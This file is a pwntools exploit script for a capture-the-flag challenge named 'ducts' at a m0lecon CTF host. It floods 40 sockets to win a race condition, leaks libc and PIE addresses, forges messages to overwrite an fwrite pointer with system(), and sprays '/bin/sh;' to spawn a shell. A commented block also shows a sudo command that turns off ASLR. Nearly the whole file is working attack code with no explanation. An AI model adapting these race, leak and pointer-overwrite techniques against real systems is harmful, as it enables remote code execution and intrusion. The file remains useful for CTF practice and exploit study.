from pwn import *
import IPython
import time
import sys
import threading
from pwn import flat
import re
'''
# disable aslr
echo 0 | sudo tee /proc/sys/kernel/randomize_va_space

# enable aslr
echo 2 | sudo tee /proc/sys/kernel/randomize_va_space

# Define your payload parts
offset = 100  # The offset where you want to insert your value
value = 0xdeadbeef  # The value to place at the offset
padding = b'A'  # Padding to fill before the offset

# Create the payload with the specified offset and 32-bit word size
payload = flat(
    {
        0x10: p64(0x4242424242424242),
        0x18: p64(0x4242424242424243),    
    }, 
    
    length=offset + 4,  # Length of the total payload (4 bytes for 32-bit word)
    word_size=32,  # Set word size to 32 bits
    filler=padding  # Optional: padding to fill space before the offset
)

print(payload)
sys.exit()
'''
local_bin = "./chal_patched"
libc = ELF("./libc.so.6")
elf = ELF(local_bin)
rop = ROP(elf)
# context.log_level = 'debug'

# p = gdb.debug(local_bin, '''
#     set follow-fork-mode parent
#     continue
# 	''')

debug = True
if debug == True:
    host = "localhost"
else:
    host = "ducts.challs.m0lecon.it"


if debug:
    parent = process(local_bin)
else:
    parent = remote("ducts.challs.m0lecon.it", 4444)

leak = parent.recvuntil(b'Port is ')
leak = parent.recv()
leak = int(leak[:-1])
port = leak
print(leak)

print(f"PORT = {port}")
NUM_SOCK = 40
PRINT_MESSAGE = 0xDEADBEEF
REDACT_MESSAGE = 0xCAFEBABE
FLUSH_MESSAGE = 0xDEADC0DE

socks = []
for i in range(0, NUM_SOCK):
    p = remote(host, int(port))
    socks.append(p)

def sla(sock,receive,reply):
    sock.sendlineafter(receive,reply,timeout=3)

def sa(sock,receive,reply):
    sock.sendafter(receive,reply)


'''
# Destroy message
b *0x5555555554C6 if $rsi != 0x21000

# Identify incoming
b *0x555555555751 if $eax != 0
'''
payload = b'A' * 0x21000
p_init = remote(host, int(port))
sla(p_init, "What do you want to destroy", payload)
payload = b'B' * 0x40
sla(p_init, "Please leave also your name", payload)


# when filler is \x01, we avoid creating multiple fake messages
payload = flat(
    {
        0x0: p32(0x1),
        0x4: PRINT_MESSAGE,
    },     
    length=0x5000,  # Length of the total payload (4 bytes for 32-bit word)
    word_size=32,   # Set word size to 32 bits
    filler=b'\x01'  # Optional: padding to fill space before the offset
)

for i in range(0, NUM_SOCK):
    sla(socks[i], "What do you want to destroy", payload)

payload = b'C' * 0x30
start_event = threading.Event()

# Thread function for sending the second payload
def send_payload(sock):
    start_event.wait()
    sla(sock, "Please leave also your name", payload)

# Creating threads for each socket
threads = []
for i in range(0, NUM_SOCK):
    t = threading.Thread(target=send_payload, args=(socks[i],))
    threads.append(t)

# Start all threads
for t in threads:
    t.start()

sleep(1)
start_event.set()

# Wait for all threads to finish
for t in threads:
    t.join()

# Sleep for any additional handling after sending
sleep(2)
for i in range(0, NUM_SOCK):
    leak = socks[i].close()

leak = parent.recvuntil(b'Message 0x')
leak = parent.recvuntil(b'Destroying message')
print(leak)
if (b'Next' in leak):
    leak = leak.decode('utf-8')
    
    print("[+] Race success")
    libc_leak = leak[0:12]
    libc_base = int(libc_leak,0x10)-(0x7ffff7f96010-0x7ffff7c00000)
    print(f"[+] libc_leak: 0x{libc_leak}")
    print(f"[+] libc_base: {hex(libc_base)}")
    if (libc_base & 0xFF != 0x00):
        print(f"[+] libc_base is not right (?)")
        sys.exit(0)

    matches = re.findall(r"Next is 0x([0-9a-fA-F]+)", leak)
    if matches:
        pie_leak = matches[-1]
        print(f"[+] pie_leak: 0x{pie_leak}")
else:
    print("[-] Race failed")
    sys.exit(-1)

# parent.interactive()

FWRITE = 0x5555555580b0
READ = 0x555555558068
target_write = int(pie_leak,0x10)-(0x555555558120-FWRITE)
target_value = libc.sym["system"] + libc_base
print(f"target_write: 0x{hex(target_write)}!")
###################################################################
########################### [ STAGE 2 ] ###########################
###################################################################
print("Attach debugger!")
# parent.interactive()

socks = []
for i in range(0, NUM_SOCK):
    p = remote(host, int(port))
    socks.append(p)

guess_start = 60
payload = flat(
    {
        0x0: p32(0x1),  # cmd handle
        0x4: 0x1,
        
        0x18:       p32(0x41414141),
        0x18+0x4:   p32(0x42424242),
        0x20:       p32(0x0),               # message header next
        0x20+0x4:   p32(0x0),               # size of destroy buf
        0x20+0x8:   p64(target_write-0x50),    # null ptr / arbitrary write target
        

        # if u use flush first, then guess_start will always be 1
        0x100:      p32(0x1),   # cmd handle
        0x104:      p32(FLUSH_MESSAGE),
        0x108:      p64(guess_start-1),
        0x110:      p64(target_value),

        0x118:       p32(0x41414141),       # nop slide
        0x118+0x4:   p32(0x42424242),       # nop slide
        0x120:       p32(0x0),              # message header next
        0x124:       p32(0x0),              # size of destroy buf
        0x128:       p64(target_write-0x50),        # null ptr / arbitrary write target



        0x200+(0x18 * 1):      p32(0x1),   # cmd handle
        0x204+(0x18 * 1):      p32(REDACT_MESSAGE),
        0x208+(0x18 * 1):      p64(1),
        0x210+(0x18 * 1):      p64(target_value),

        # 0x100+(0x18 * 2):      p32(0x1),   # cmd handle
        # 0x104+(0x18 * 2):      p32(REDACT_MESSAGE),
        # 0x108+(0x18 * 2):      p64(guess_start + 1),
        # 0x110+(0x18 * 2):      p64(0x9090909090909090),

        # 0x100+(0x18 * 3):      p32(0x1),   # cmd handle
        # 0x104+(0x18 * 3):      p32(REDACT_MESSAGE),
        # 0x108+(0x18 * 3):      p64(guess_start + 2),
        # 0x110+(0x18 * 3):      p64(0x9090909090909090),

        # 0x100+(0x18 * 4):      p32(0x1),   # cmd handle
        # 0x104+(0x18 * 4):      p32(REDACT_MESSAGE),
        # 0x108+(0x18 * 4):      p64(guess_start + 3),
        # 0x110+(0x18 * 4):      p64(0x9090909090909090),

        # 0x100+(0x18 * 5):      p32(0x1),   # cmd handle
        # 0x104+(0x18 * 5):      p32(REDACT_MESSAGE),
        # 0x108+(0x18 * 5):      p64(guess_start + 4),
        # 0x110+(0x18 * 5):      p64(0x9090909090909090),

        # 0x100+(0x18 * 6):      p32(0x1),   # cmd handle
        # 0x104+(0x18 * 6):      p32(REDACT_MESSAGE),
        # 0x108+(0x18 * 6):      p64(guess_start + 5),
        # 0x110+(0x18 * 6):      p64(0x9090909090909090),

        # 0x100+(0x18 * 7):      p32(0x1),   # cmd handle
        # 0x104+(0x18 * 7):      p32(REDACT_MESSAGE),
        # 0x108+(0x18 * 7):      p64(guess_start + 6),
        # 0x110+(0x18 * 7):      p64(0x9090909090909090),

        # 0x100+(0x18 * 8):      p32(0x1),   # cmd handle
        # 0x104+(0x18 * 8):      p32(REDACT_MESSAGE),
        # 0x108+(0x18 * 8):      p64(guess_start + 7),
        # 0x110+(0x18 * 8):      p64(0x9090909090909090),

        # 0x100+(0x18 * 8):      p32(0x1),   # cmd handle
        # 0x104+(0x18 * 8):      p32(REDACT_MESSAGE),
        # 0x108+(0x18 * 8):      p64(guess_start + 8),
        # 0x110+(0x18 * 8):      p64(0x9090909090909090),

        # 0x100+(0x18 * 10):      p32(0x1),   # cmd handle
        # 0x104+(0x18 * 10):      p32(REDACT_MESSAGE),
        # 0x108+(0x18 * 10):      p64(guess_start + 9),
        # 0x110+(0x18 * 10):      p64(0x9090909090909090),




        0x300:      p32(0x0),   # cmd handle
        0x304:      p32(0x50000),
        0x308:      p64(0x55555555800),
        0x310:      p64(target_value),

        0x318:      "/bin/sh;",
        0x320:      "/bin/sh;",
        0x328:      "/bin/sh;",

    },     
    length=0x5000,  # Length of the total payload (4 bytes for 32-bit word)
    word_size=32,   # Set word size to 32 bits
    filler=b'/bin/sh;'  # Optional: padding to fill space before the offset
)

for i in range(0, NUM_SOCK):
    sla(socks[i], "What do you want to destroy", payload)

payload = b'/bin/sh;' * 0x5
start_event = threading.Event()

# Thread function for sending the second payload
def send_payload(sock):
    start_event.wait()
    sla(sock, "Please leave also your name", payload)

# Now we forge a message
threads = []
for i in range(0, NUM_SOCK):
    t = threading.Thread(target=send_payload, args=(socks[i],))
    threads.append(t)

# Start all threads
for t in threads:
    t.start()

sleep(1)
start_event.set()

# Wait for all threads to finish
for t in threads:
    t.join()

# Sleep for any additional handling after sending
sleep(5)
for i in range(0, NUM_SOCK):
    leak = socks[i].close()

# leak = parent.recv()
# if (b'Next' in leak):
#     leak = leak.decode('utf-8')
#     print("[+] Race success")
#     matches = re.findall(r"Message 0x([0-9a-fA-F]+)", leak)
#     num_messages = len(matches)
#     print(f"[+] num_messages: {num_messages}")
#     # IPython.embed()
# else:
#     print(f"[-] Second race failed")
#     sys.exit(-1)

time.sleep(1)
for i in range(0, 5):
    p = remote(host, int(port))
    sla(p, "What do you want to destroy", b'A' * 0x10000)
    p.close()
parent.interactive()


